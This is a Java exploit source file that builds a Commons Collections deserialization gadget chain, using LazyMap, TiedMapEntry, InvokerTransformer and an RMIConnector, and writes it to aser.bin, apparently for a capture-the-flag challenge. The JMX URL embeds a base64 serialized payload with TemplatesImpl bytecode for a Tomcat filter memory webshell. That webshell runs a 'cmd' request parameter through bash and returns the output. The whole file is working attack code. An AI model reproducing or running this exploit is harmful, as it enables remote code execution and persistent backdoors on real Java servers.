package com.example.demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Hello world!
 *
 */
public class Exp
{
    public static void main( String[] args ) throws Exception
    {

        RMIConnector rmiConnector = (RMIConnector) getObject();
//        rmiConnector.connect();

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazyMap.remove(rmiConnector);

        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,invokerTransformer);

        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream("aser.bin"));
        objOut.writeUTF("SJTU");
        objOut.writeInt(1896);
        objOut.writeObject(map2);
        objOut.close();

    }

    public static Object getObject() throws Exception {

        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:iiop:///stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAaUcr+ur4AAAA0AT0KAEsApAcApQgApgsAAgCnBwCoBwCpCACqCACrCACsCgAFAK0KAAUArgcArwcAsAoAsQCyCgANALMKAAwAtAcAtQoAEQCkCgAMALYHALcKABQApAoAFAC4CAC5CgC6ALsKABQAvAoAEQC9CwC+AL8KAAYAwAoAwQDCCgCxAMMLAMQAxQgAxgoAugDHCgAUAMgIAMkKAMoAywoAygDMBwDNCgAmAM4LAM8A0AcA0QoASADSCgBEANMIAJIKAEQA1AcA1QoA1gDXCgDWANgHANkHANoKADIApAcA2woANACkCgA0ANwKADQA3QoARADeCgA0AN8KACkA4AcA4QoAOwCkCgA7AOIKADsA3QkA4wDkCgDjAOUKADsA5goAKQDnBwDoBwDpBwDqCgBEAOsKAOwA1wcA7QoA7ADuCwAxAO8HAPAHAPEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAMUxjb20vZXhhbXBsZS9kZW1vL1RvbWNhdEZpbHRlck1lbVNoZWxsRnJvbVRocmVhZDsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwDyAQAQTWV0aG9kUGFyYW1ldGVycwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEADVN0YWNrTWFwVGFibGUHANoHAPMHAPQHAPUHAKUHAPYHAK8HAKkHALUHAPcBAAdkZXN0cm95AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcA+AEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEbmFtZQEAClVSTFBhdHRlcm4BABV3ZWJhcHBDbGFzc0xvYWRlckJhc2UBADJMb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlOwEAD3N0YW5kYXJkQ29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEABmFDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAHQ29uZmlncwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQAOYmVoaW5kZXJGaWx0ZXIBAAlmaWx0ZXJEZWYBADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWY7AQAJZmlsdGVyTWFwAQAxTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwOwEAC2NvbnN0cnVjdG9yAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWc7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAPkxqYXZhL2xhbmcvQ2xhc3M8K0xvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0Oz47BwDNBwDRBwDpBwDVAQAKU291cmNlRmlsZQEAI1RvbWNhdEZpbHRlck1lbVNoZWxsRnJvbVRocmVhZC5qYXZhDABNAE4BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQABYwwA+QD6AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEABGJhc2gBAAItYwEAA2NtZAwATQD7DAD8AP0BABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcA9gwA/gD/DABNAQAMAE0BAQEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIMAQIBAwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEEAQUBAA5saW5lLnNlcGFyYXRvcgcBBgwBBwD6DAEIAQMMAQQBCQcA9AwBCgELDABNAQwHAQ0MAQ4BDwwAeABOBwD1DABbARABAA9NeUZpbHRlclZlcnNpb24MAREBEgwBBAETAQACLyoHARQMARUBFgwBFwEYAQAwb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlDAEZARoHARsMARwBHQEAKG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQMAR4BHwwBIAEfDAEhASIBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwEjDAEkASUMASYBJwEADWphdmEvdXRpbC9NYXABAC9jb20vZXhhbXBsZS9kZW1vL1RvbWNhdEZpbHRlck1lbVNoZWxsRnJvbVRocmVhZAEAL29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyRGVmDAEoASkMASoBDwwBKwEDDAEsAQ8MAS0BLgEAL29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwDAEvAQ8HATAMATEBMgwAiAEDDAEzAQ8MATQBNQEAMG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZwEAD2phdmEvbGFuZy9DbGFzcwEAG29yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dAwBNgE3BwE4AQAQamF2YS9sYW5nL09iamVjdAwBOQE6DAE7ATwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAh0b1N0cmluZwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABsoTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7KVYBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAIbmFub1RpbWUBAAMoKUoBABwoSilMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxnZXRSZXNvdXJjZXMBACcoKUxvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdDsBACNvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdAEACmdldENvbnRleHQBAB8oKUxvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQ7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQANZ2V0U3VwZXJjbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAlzZXRGaWx0ZXIBABkoTGphdmF4L3NlcnZsZXQvRmlsdGVyOylWAQANc2V0RmlsdGVyTmFtZQEAB2dldE5hbWUBAA5zZXRGaWx0ZXJDbGFzcwEADGFkZEZpbHRlckRlZgEANChMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWY7KVYBAA1hZGRVUkxQYXR0ZXJuAQAcamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZQEAB1JFUVVFU1QBAB5MamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZTsBAA1zZXREaXNwYXRjaGVyAQASYWRkRmlsdGVyTWFwQmVmb3JlAQA0KExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcDspVgEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQADcHV0AQA4KExqYXZh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");
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,new HashMap());
        return rmiConnector;
    }
}
